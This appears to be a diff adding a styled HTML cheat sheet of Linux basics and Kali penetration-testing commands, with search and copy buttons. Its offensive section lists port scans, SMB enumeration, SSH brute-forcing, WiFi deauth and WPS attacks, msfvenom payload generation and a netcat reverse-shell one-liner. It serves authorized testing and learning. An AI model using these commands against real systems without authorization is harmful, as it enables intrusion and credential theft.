@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Linux Command Cheat Sheet</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #14120F;
+    --bg-panel: #1B1712;
+    --bg-card: #1F1B14;
+    --amber: #FFB000;
+    --amber-dim: #C98A00;
+    --amber-faint: rgba(255,176,0,0.12);
+    --text: #E8DFC8;
+    --text-muted: #8A8172;
+    --border: #332C1F;
+    --border-soft: #2A241A;
+    --red: #E2564A;
+    --green: #8FBF6A;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  body {
+    min-height: 100vh;
+    position: relative;
+  }
+
+  /* subtle CRT scanline texture */
+  body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    background: repeating-linear-gradient(
+      to bottom,
+      rgba(255,255,255,0.012) 0px,
+      rgba(255,255,255,0.012) 1px,
+      transparent 1px,
+      transparent 3px
+    );
+    z-index: 999;
+  }
+
+  .wrap {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 20px 80px;
+  }
+
+  /* window chrome */
+  .titlebar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    max-width: 1100px;
+    margin: 0 auto;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; background: var(--border-soft); }
+  .dot.red { background: #5A2E28; }
+  .dot.amber { background: #5A4519; }
+  .dot.green { background: #2E4A26; }
+  .titlebar .path {
+    margin-left: 12px;
+    color: var(--text-muted);
+    font-size: 13px;
+    letter-spacing: 0.02em;
+  }
+
+  header.hero {
+    padding: 56px 0 36px;
+    border-bottom: 1px solid var(--border);
+  }
+  .prompt-line {
+    color: var(--green);
+    font-size: 14px;
+    margin-bottom: 10px;
+  }
+  .prompt-line .path-part { color: var(--amber-dim); }
+  h1 {
+    font-size: 34px;
+    font-weight: 700;
+    margin: 0 0 10px;
+    letter-spacing: -0.01em;
+    color: var(--text);
+  }
+  h1 .blink-cursor {
+    display: inline-block;
+    width: 16px;
+    color: var(--amber);
+    animation: blink 1.1s steps(1) infinite;
+  }
+  .subtitle {
+    color: var(--text-muted);
+    font-size: 14px;
+    line-height: 1.7;
+    max-width: 640px;
+    margin: 0 0 28px;
+  }
+
+  @keyframes blink { 50% { opacity: 0; } }
+
+  /* search */
+  .search-shell {
+    display: flex;
+    align-items: center;
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 12px 16px;
+    gap: 10px;
+  }
+  .search-shell:focus-within {
+    border-color: var(--amber-dim);
+  }
+  .search-shell .prefix { color: var(--amber); font-size: 15px; user-select: none; }
+  .search-shell input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 15px;
+    caret-color: var(--amber);
+  }
+  .search-shell input::placeholder { color: var(--text-muted); }
+  .search-count {
+    color: var(--text-muted);
+    font-size: 12px;
+    white-space: nowrap;
+  }
+  .hint {
+    margin-top: 10px;
+    color: var(--text-muted);
+    font-size: 12px;
+  }
+  .hint kbd {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 6px;
+    font-size: 11px;
+    color: var(--text);
+  }
+
+  /* grid */
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+    gap: 18px;
+    margin-top: 36px;
+  }
+
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+  .card.kali { border-color: #3A2320; }
+  .card-head {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border-soft);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .card-head .hash { color: var(--amber-dim); font-size: 13px; }
+  .card.kali .card-head .hash { color: var(--red); }
+  .card-head .cat-name {
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--amber);
+    letter-spacing: 0.01em;
+  }
+  .card.kali .card-head .cat-name { color: #F0837A; }
+  .card-body { padding: 6px 0; }
+
+  .group-divider {
+    grid-column: 1 / -1;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 22px 0 2px;
+    color: var(--text-muted);
+    font-size: 12px;
+  }
+  .group-divider:first-child { margin-top: 0; }
+  .group-divider .line { flex: 1; height: 1px; background: var(--border); }
+  .group-divider .label { white-space: nowrap; letter-spacing: 0.03em; }
+  .group-divider.kali .label { color: var(--red); }
+
+  .row {
+    display: grid;
+    grid-template-columns: 148px 1fr auto;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.02);
+    transition: background 0.12s ease;
+  }
+  .row:last-child { border-bottom: none; }
+  .row:hover { background: var(--amber-faint); }
+  .row.hidden { display: none; }
+
+  .cmd {
+    font-size: 13px;
+    color: var(--green);
+    font-weight: 500;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .desc {
+    font-size: 12.5px;
+    color: var(--text-muted);
+    line-height: 1.4;
+  }
+
+  .copy-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    color: var(--text-muted);
+    width: 26px;
+    height: 26px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    flex-shrink: 0;
+    padding: 0;
+  }
+  .copy-btn:hover { border-color: var(--amber-dim); color: var(--amber); }
+  .copy-btn.copied { border-color: var(--green); color: var(--green); }
+  .copy-btn svg { width: 13px; height: 13px; }
+
+  .empty-state {
+    display: none;
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text-muted);
+    font-size: 13px;
+  }
+  .empty-state .big { color: var(--red); font-size: 14px; margin-bottom: 8px; }
+
+  footer {
+    margin-top: 60px;
+    padding-top: 20px;
+    border-top: 1px solid var(--border);
+    color: var(--text-muted);
+    font-size: 12px;
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  footer .end-prompt { color: var(--amber-dim); }
+
+  @media (max-width: 560px) {
+    .row { grid-template-columns: 1fr auto; }
+    .cmd { grid-column: 1 / 2; }
+    .desc { grid-column: 1 / 3; }
+    h1 { font-size: 26px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="titlebar">
+  <span class="dot red"></span>
+  <span class="dot amber"></span>
+  <span class="dot green"></span>
+  <span class="path">user@linux — cheatsheet.sh — 80x24</span>
+</div>
+
+<div class="wrap">
+  <header class="hero">
+    <div class="prompt-line"><span class="path-part">~/reference</span> $ cat linux_commands.sh</div>
+    <h1>Linux command cheat sheet<span class="blink-cursor">▍</span></h1>
+    <p class="subtitle">From everyday Linux basics to Kali Linux pentesting tools, the commands you actually reach for. Search below, or scan by category. Click the copy icon to grab a command.</p>
+
+    <div class="search-shell">
+      <span class="prefix">$</span>
+      <input id="search" type="text" placeholder="grep -i &quot;search commands or descriptions...&quot;" autocomplete="off" spellcheck="false">
+      <span class="search-count" id="count">80 commands</span>
+    </div>
+    <div class="hint">Press <kbd>/</kbd> to focus search</div>
+  </header>
+
+  <div class="grid" id="grid"></div>
+
+  <div class="empty-state" id="empty">
+    <div class="big">grep: no matches found</div>
+    <div>Try a different command name or keyword.</div>
+  </div>
+
+  <footer>
+    <span>For authorized security testing and learning only. Built for quick reference, not a substitute for <span style="color:var(--text)">man</span>.</span>
+    <span class="end-prompt">user@linux:~$ <span class="blink-cursor" style="color:var(--amber-dim)">▍</span></span>
+  </footer>
+</div>
+
+<script>
+const DATA = [
+  {
+    cat: "file_operations",
+    group: "basics",
+    items: [
+      ["ls -la", "List all files, including hidden, with details"],
+      ["cd path/", "Change the working directory"],
+      ["pwd", "Print the current working directory"],
+      ["cp -r src dst", "Copy files or directories recursively"],
+      ["mv src dst", "Move or rename a file or directory"],
+      ["rm -rf dir/", "Remove a directory and its contents, forcefully"],
+      ["mkdir -p a/b/c", "Create nested directories in one go"],
+      ["find . -name '*.log'", "Find files by name under a directory"]
+    ]
+  },
+  {
+    cat: "permissions",
+    group: "basics",
+    items: [
+      ["chmod 755 file", "Set permissions to rwxr-xr-x"],
+      ["chmod +x file", "Make a file executable"],
+      ["chown user:group file", "Change file owner and group"],
+      ["chgrp group file", "Change the group of a file"],
+      ["umask 022", "Set the default permission mask"],
+      ["ls -l", "View permission bits for files"],
+      ["sudo -i", "Start an interactive root shell"],
+      ["passwd", "Change the current user's password"]
+    ]
+  },
+  {
+    cat: "process_management",
+    group: "basics",
+    items: [
+      ["ps aux", "List all running processes"],
+      ["top", "Live view of running processes and load"],
+      ["kill -9 PID", "Force kill a process by its PID"],
+      ["killall name", "Kill all processes matching a name"],
+      ["jobs", "List background jobs in the current shell"],
+      ["fg %1", "Bring a background job to the foreground"],
+      ["nice -n 10 cmd", "Run a command with lower scheduling priority"],
+      ["systemctl status svc", "Check the status of a systemd service"]
+    ]
+  },
+  {
+    cat: "networking",
+    group: "basics",
+    items: [
+      ["ip a", "Show network interfaces and IP addresses"],
+      ["ping host", "Test connectivity to a host"],
+      ["curl -I url", "Fetch only the response headers of a URL"],
+      ["wget url", "Download a file from a URL"],
+      ["ss -tulnp", "List listening TCP/UDP ports and owning processes"],
+      ["netstat -tulnp", "Legacy listing of listening ports"],
+      ["scp file user@host:path", "Copy a file to a remote host over SSH"],
+      ["traceroute host", "Trace the network path to a host"]
+    ]
+  },
+  {
+    cat: "package_management",
+    group: "basics",
+    items: [
+      ["apt update && apt upgrade", "Refresh and upgrade packages (Debian/Ubuntu)"],
+      ["apt install pkg", "Install a package"],
+      ["apt remove pkg", "Remove an installed package"],
+      ["dpkg -l", "List all installed packages"],
+      ["yum install pkg", "Install a package (RHEL/CentOS)"],
+      ["dnf install pkg", "Install a package (Fedora)"],
+      ["snap install pkg", "Install a package via Snap"],
+      ["apt search term", "Search available packages by keyword"]
+    ]
+  },
+  {
+    cat: "disk_and_storage",
+    group: "basics",
+    items: [
+      ["df -h", "Show disk space usage in human-readable form"],
+      ["du -sh dir/", "Show total size of a directory"],
+      ["lsblk", "List block devices and partitions"],
+      ["mount /dev/sdX /mnt", "Mount a device to a directory"],
+      ["umount /mnt", "Unmount a mounted device"],
+      ["fdisk -l", "List all disk partitions"],
+      ["fsck /dev/sdX", "Check and repair a filesystem"],
+      ["dd if=in of=out", "Low-level copy of files or devices"]
+    ]
+  },
+  {
+    cat: "text_processing",
+    group: "basics",
+    items: [
+      ["grep -r \"text\" .", "Recursively search for text in files"],
+      ["sed 's/a/b/g' file", "Find and replace text in a file"],
+      ["awk '{print $1}' file", "Extract a column of text"],
+      ["sort file", "Sort lines in a file"],
+      ["uniq", "Remove or count duplicate adjacent lines"],
+      ["wc -l file", "Count the number of lines in a file"],
+      ["cat file", "Print a file's contents to the terminal"],
+      ["less file", "View a file one page at a time"]
+    ]
+  },
+  {
+    cat: "system_info",
+    group: "basics",
+    items: [
+      ["uname -a", "Show kernel and system information"],
+      ["uptime", "Show system uptime and load average"],
+      ["free -h", "Show memory usage in human-readable form"],
+      ["lscpu", "Show detailed CPU information"],
+      ["vmstat 1", "Report virtual memory statistics every second"],
+      ["dmesg", "Show kernel ring buffer log messages"],
+      ["who", "Show who is currently logged in"],
+      ["history", "Show recently run commands"]
+    ]
+  },
+  {
+    cat: "compression",
+    group: "basics",
+    items: [
+      ["tar -czvf out.tar.gz dir/", "Create a gzip-compressed tar archive"],
+      ["tar -xzvf file.tar.gz", "Extract a gzip-compressed tar archive"],
+      ["zip -r out.zip dir/", "Create a zip archive"],
+      ["unzip file.zip", "Extract a zip archive"],
+      ["gzip file", "Compress a file with gzip"],
+      ["gunzip file.gz", "Decompress a gzip file"]
+    ]
+  },
+  {
+    cat: "users_and_sessions",
+    group: "basics",
+    items: [
+      ["whoami", "Print the current logged-in user"],
+      ["su - user", "Switch to another user"],
+      ["adduser name", "Create a new user"],
+      ["usermod -aG group user", "Add a user to a group"],
+      ["id", "Show the current user's uid, gid, and groups"],
+      ["w", "Show who is logged in and what they're running"],
+      ["exit", "Close the current shell or session"],
+      ["ssh user@host", "Log in to a remote host over SSH"]
+    ]
+  },
+  {
+    cat: "network_scanning",
+    group: "kali",
+    items: [
+      ["nmap -sV -p- target", "Full port scan with service version detection"],
+      ["nmap -sC -sV target", "Default scripts plus service detection"],
+      ["nmap -A target", "Aggressive scan: OS, version, scripts, traceroute"],
+      ["nmap -sU target", "Scan UDP ports"],
+      ["nmap --script vuln target", "Run vulnerability-detection scripts"],
+      ["masscan -p1-65535 target --rate=1000", "Very fast large-scale port scanner"],
+      ["netdiscover -r 192.168.1.0/24", "Discover live hosts on a subnet"],
+      ["arp-scan -l", "Scan the local network using ARP"]
+    ]
+  },
+  {
+    cat: "smb_enumeration",
+    group: "kali",
+    items: [
+      ["smbclient -L //target -N", "List shares anonymously"],
+      ["smbclient //target/share -N", "Connect to a specific SMB share"],
+      ["smbmap -H target", "Enumerate share permissions"],
+      ["enum4linux -a target", "Full SMB and NetBIOS enumeration"],
+      ["crackmapexec smb target -u user -p pass", "Authenticate and enumerate over SMB"],
+      ["rpcclient -U \"\" target", "Null-session RPC enumeration"],
+      ["nbtstat -A target", "Show the NetBIOS name table of a host"],
+      ["showmount -e target", "List NFS exports on a host"]
+    ]
+  },
+  {
+    cat: "web_app_testing",
+    group: "kali",
+    items: [
+      ["sqlmap -u \"url\" --dbs", "Test a URL for SQL injection, list databases"],
+      ["gobuster dir -u url -w wordlist", "Brute-force directories and files"],
+      ["ffuf -u url/FUZZ -w wordlist", "Fast web fuzzer for paths and parameters"],
+      ["nikto -h target", "Scan a web server for known issues"],
+      ["whatweb target", "Fingerprint web technologies in use"],
+      ["wpscan --url target", "Scan a WordPress install for vulnerabilities"],
+      ["dirb url wordlist", "Brute-force directories, alternative to gobuster"],
+      ["curl -X POST -d \"data\" url", "Send a crafted POST request"]
+    ]
+  },
+  {
+    cat: "password_attacks",
+    group: "kali",
+    items: [
+      ["hydra -l user -P wordlist ssh://target", "Brute-force an SSH login"],
+      ["john --wordlist=rockyou.txt hash.txt", "Crack password hashes with a wordlist"],
+      ["john --show hash.txt", "Show passwords already cracked by john"],
+      ["hashcat -m 0 hash.txt wordlist", "GPU-accelerated hash cracking"],
+      ["crunch 8 8 -o wordlist.txt", "Generate a custom wordlist"],
+      ["medusa -h target -u user -P wordlist -M ssh", "Parallel login brute-forcer"],
+      ["cewl url -w wordlist.txt", "Generate a wordlist from a website's content"],
+      ["hash-identifier", "Identify the type of a password hash"]
+    ]
+  },
+  {
+    cat: "wireless_attacks",
+    group: "kali",
+    items: [
+      ["airmon-ng start wlan0", "Enable monitor mode on a wireless adapter"],
+      ["airodump-ng wlan0mon", "Capture nearby wireless traffic"],
+      ["aireplay-ng --deauth 10 -a BSSID wlan0mon", "Send deauth packets to capture a handshake"],
+      ["aircrack-ng capture.cap -w wordlist", "Crack a captured WPA handshake"],
+      ["wifite", "Automated wireless network attack tool"],
+      ["reaver -i wlan0mon -b BSSID -vv", "Attack a router's WPS PIN"],
+      ["macchanger -r wlan0", "Randomize a network interface's MAC address"],
+      ["kismet", "Wireless network detector and packet sniffer"]
+    ]
+  },
+  {
+    cat: "exploitation_and_post",
+    group: "kali",
+    items: [
+      ["msfconsole", "Launch the Metasploit framework console"],
+      ["msfvenom -p payload LHOST=ip LPORT=port -f exe -o out.exe", "Generate a custom payload"],
+      ["searchsploit keyword", "Search the local exploit database"],
+      ["nc -lvnp 4444", "Start a netcat listener"],
+      ["nc target port -e /bin/bash", "Send a reverse shell from the target"],
+      ["rlwrap nc -lvnp 4444", "Netcat listener with readline support"],
+      ["python3 -m http.server 80", "Quick HTTP server to serve payloads or files"],
+      ["scp file user@host:path", "Transfer files to a compromised host over SSH"]
+    ]
+  },
+  {
+    cat: "privilege_escalation",
+    group: "kali",
+    items: [
+      ["sudo -l", "List commands the current user can run as sudo"],
+      ["find / -perm -4000 2>/dev/null", "Find SUID binaries on the filesystem"],
+      ["getcap -r / 2>/dev/null", "Find binaries with special Linux capabilities"],
+      ["./linpeas.sh", "Run an automated Linux privilege-escalation scan"],
+      ["winpeas.exe", "Run an automated Windows privilege-escalation scan"],
+      ["cat /etc/crontab", "Check system-wide scheduled cron jobs"],
+      ["uname -r", "Check kernel version for known exploits"],
+      ["id", "Check the current user's privileges and groups"]
+    ]
+  },
+  {
+    cat: "recon_and_osint",
+    group: "kali",
+    items: [
+      ["whois domain", "Get domain registration information"],
+      ["dig domain any", "Query all DNS records for a domain"],
+      ["theHarvester -d domain -b all", "Gather emails and subdomains from public sources"],
+      ["dnsenum domain", "Enumerate DNS information for a domain"],
+      ["sublist3r -d domain", "Enumerate subdomains of a target domain"],
+      ["amass enum -d domain", "In-depth subdomain enumeration"],
+      ["shodan host ip", "Look up a host's exposed services on Shodan"],
+      ["wafw00f url", "Detect if a site is behind a web application firewall"]
+    ]
+  }
+];
+
+const grid = document.getElementById('grid');
+const searchInput = document.getElementById('search');
+const countEl = document.getElementById('count');
+const emptyEl = document.getElementById('empty');
+
+const copyIcon = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
+const checkIcon = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
+
+let totalCount = 0;
+let lastGroup = null;
+
+DATA.forEach(section => {
+  if (section.group && section.group !== lastGroup) {
+    const divider = document.createElement('div');
+    divider.className = 'group-divider' + (section.group === 'kali' ? ' kali' : '');
+    const label = section.group === 'kali' ? '## kali_pentesting_tools' : '## linux_basics';
+    divider.innerHTML = `<span class="line"></span><span class="label">${label}</span><span class="line"></span>`;
+    grid.appendChild(divider);
+    lastGroup = section.group;
+  }
+
+  const card = document.createElement('div');
+  card.className = 'card' + (section.group === 'kali' ? ' kali' : '');
+  card.dataset.cat = section.cat;
+  card.dataset.group = section.group || '';
+
+  const head = document.createElement('div');
+  head.className = 'card-head';
+  head.innerHTML = `<span class="hash">#</span><span class="cat-name">${section.cat}.sh</span>`;
+  card.appendChild(head);
+
+  const body = document.createElement('div');
+  body.className = 'card-body';
+
+  section.items.forEach(([cmd, desc]) => {
+    totalCount++;
+    const row = document.createElement('div');
+    row.className = 'row';
+    row.dataset.search = (cmd + ' ' + desc + ' ' + section.cat).toLowerCase();
+
+    const cmdEl = document.createElement('div');
+    cmdEl.className = 'cmd';
+    cmdEl.textContent = cmd;
+
+    const descEl = document.createElement('div');
+    descEl.className = 'desc';
+    descEl.textContent = desc;
+
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.type = 'button';
+    btn.setAttribute('aria-label', 'Copy command');
+    btn.innerHTML = copyIcon;
+    btn.addEventListener('click', () => {
+      navigator.clipboard.writeText(cmd).then(() => {
+        btn.innerHTML = checkIcon;
+        btn.classList.add('copied');
+        setTimeout(() => {
+          btn.innerHTML = copyIcon;
+          btn.classList.remove('copied');
+        }, 1200);
+      }).catch(() => {});
+    });
+
+    row.appendChild(cmdEl);
+    row.appendChild(descEl);
+    row.appendChild(btn);
+    body.appendChild(row);
+  });
+
+  card.appendChild(body);
+  grid.appendChild(card);
+});
+
+countEl.textContent = totalCount + ' commands';
+
+function applyFilter(query) {
+  const q = query.trim().toLowerCase();
+  let visibleCount = 0;
+
+  document.querySelectorAll('.card').forEach(card => {
+    let cardHasVisible = false;
+    card.querySelectorAll('.row').forEach(row => {
+      const match = q === '' || row.dataset.search.includes(q);
+      row.classList.toggle('hidden', !match);
+      if (match) { cardHasVisible = true; visibleCount++; }
+    });
+    card.style.display = cardHasVisible ? '' : 'none';
+  });
+
+  // hide a group divider if every card in its group is hidden
+  document.querySelectorAll('.group-divider').forEach(div => {
+    let sib = div.nextElementSibling;
+    let groupVisible = false;
+    while (sib && !sib.classList.contains('group-divider')) {
+      if (sib.style.display !== 'none') { groupVisible = true; break; }
+      sib = sib.nextElementSibling;
+    }
+    div.style.display = groupVisible ? '' : 'none';
+  });
+
+  countEl.textContent = visibleCount + (q ? ' matches' : ' commands');
+  emptyEl.style.display = visibleCount === 0 ? 'block' : 'none';
+  grid.style.display = visibleCount === 0 ? 'none' : 'grid';
+}
+
+searchInput.addEventListener('input', e => applyFilter(e.target.value));
+
+document.addEventListener('keydown', e => {
+  if (e.key === '/' && document.activeElement !== searchInput) {
+    e.preventDefault();
+    searchInput.focus();
+  }
+  if (e.key === 'Escape' && document.activeElement === searchInput) {
+    searchInput.value = '';
+    applyFilter('');
+    searchInput.blur();
+  }
+});
+</script>
+
+</body>
+</html>
